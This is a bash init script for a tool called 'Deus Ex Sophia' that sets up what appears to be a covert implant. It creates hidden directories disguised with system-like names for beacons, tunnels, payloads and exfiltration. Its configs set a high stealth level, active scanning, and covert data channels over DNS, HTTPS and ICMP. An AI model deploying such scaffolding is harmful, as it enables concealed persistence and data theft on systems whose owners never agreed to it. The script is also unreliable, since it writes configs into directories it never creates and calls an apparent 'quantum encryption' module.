#!/bin/bash
# init.sh - Deus Ex Sophia Initialization

set -e

echo "[*] Deus Ex Sophia Initialization v5.0"

# Create necessary directories
echo "[*] Creating directories..."
mkdir -p /opt/sysaux/{data,logs,config,backups}
mkdir -p /opt/sysaux/.network/{passive,active,threat,visual}
mkdir -p /opt/sysaux/.matrix/{core,channels,payloads,handlers,exfil}
mkdir -p /usr/local/lib/.systemd-aux/{beacons,tunnels,backups}
mkdir -p /var/lib/.matrix/{cache,transit,archive}
mkdir -p /etc/sophia/{keys,config,certs}

# Set permissions
echo "[*] Setting permissions..."
chmod -R 700 /opt/sysaux
chmod -R 700 /usr/local/lib/.systemd-aux
chmod -R 700 /var/lib/.matrix
chmod -R 700 /etc/sophia

# Generate encryption keys
echo "[*] Generating encryption keys..."
if [ ! -f /etc/sophia/keys/master.key ]; then
    openssl rand -base64 32 > /etc/sophia/keys/master.key
    chmod 600 /etc/sophia/keys/master.key
fi

# Generate SSL certificate for dashboard
echo "[*] Generating SSL certificate..."
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/sophia/certs/dashboard.key \
    -out /etc/sophia/certs/dashboard.crt \
    -subj "/C=XX/ST=Hidden/L=Void/O=Deus Ex Sophia/CN=sophia.local" 2>/dev/null

# Initialize databases
echo "[*] Initializing databases..."
sqlite3 /opt/sysaux/.network/threat/.threat_intel.db ".read /opt/sysaux/.network/threat/schema.sql" 2>/dev/null || true
sqlite3 /opt/sysaux/.matrix/core/.keyring.db ".read /opt/sysaux/.matrix/core/schema.sql" 2>/dev/null || true

# Create default configurations
echo "[*] Creating configurations..."
cat > /opt/sysaux/config/core.json << 'EOF'
{
    "version": "5.0",
    "environment": "docker",
    "stealth_level": 9,
    "auto_start": true,
    "log_level": "info",
    "backup_interval": 86400,
    "health_check_interval": 300
}
EOF

cat > /opt/sysaux/.network/config/network.json << 'EOF'
{
    "monitor_interfaces": ["eth0"],
    "scan_intensity": 5,
    "passive_monitoring": true,
    "active_scanning": true,
    "threat_intelligence": true,
    "scan_interval": 3600
}
EOF

cat > /opt/sysaux/.matrix/config/matrix.json << 'EOF'
{
    "encryption": {
        "algorithm": "chacha20poly1305",
        "key_rotation": 3600,
        "deniable_layers": 2
    },
    "channels": ["dns", "https", "icmp"],
    "payload_types": ["system_info", "network_scan"],
    "delivery_handlers": ["dead_drop", "covert_channel"]
}
EOF

# Generate SSH host keys if needed
echo "[*] Generating SSH keys..."
if [ ! -f /etc/ssh/ssh_host_ed25519_key ]; then
    ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N "" > /dev/null 2>&1
fi
if [ ! -f /etc/ssh/ssh_host_rsa_key ]; then
    ssh-keygen -t rsa -b 4096 -f /etc/ssh/ssh_host_rsa_key -N "" > /dev/null 2>&1
fi

# Create system user for non-root operations
echo "[*] Creating system user..."
if ! id -u sophia >/dev/null 2>&1; then
    useradd -r -s /bin/false -d /opt/sysaux -M sophia
fi
chown -R sophia:sophia /opt/sysaux/data
chown -R sophia:sophia /opt/sysaux/logs

# Initialize quantum encryption
echo "[*] Initializing quantum encryption..."
cd /opt/sysaux/.matrix/core
python3 -c "
from quantum_crypt import QuantumEncryption
qe = QuantumEncryption()
print('Quantum encryption initialized')
" 2>/dev/null || echo "[!] Quantum encryption initialization failed"

# Create initial backup
echo "[*] Creating initial backup..."
/opt/sysaux/bin/resilience.sh backup > /dev/null 2>&1 || true

echo "[✓] Initialization complete!"
echo "[*] System ready. Use 'ascend' to interact with the system."